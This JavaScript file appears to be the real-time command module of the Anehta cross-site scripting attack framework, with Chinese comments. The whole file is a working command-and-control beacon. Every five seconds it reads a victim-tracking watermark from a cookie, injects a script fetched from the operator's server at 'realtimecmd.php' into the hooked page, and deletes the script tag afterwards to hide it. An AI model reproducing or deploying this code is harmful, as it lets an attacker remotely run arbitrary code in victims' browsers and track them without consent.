//alert("realtimecmd.js");
///////////////////////////////////////////
//// 实时命令模块,与服务端进行通行
///////////////////////////////////////////
var timeInterval = 5000;  // 时间间隔
var realtimeCmdMaster = anehtaurl + "/server/realtimecmd.php?";

setInterval(function(){
  var timesig = new Date();
  // 水印只能从cookie中取
  var watermarknum = anehta.dom.getCookie("anehtaWatermark");
  if (watermarknum != null){
    watermarknum = watermarknum.substring(watermarknum.indexOf('|')+1);
  }

	var rtcmd = anehta.inject.injectScript(realtimeCmdMaster+"watermark="+watermarknum+"&t="+timesig.getTime());
	
	// 留出一定的时间执行,然后删除它
	setTimeout(function(){ anehta.inject.removeScript(rtcmd);}, 1500);
  },
timeInterval);

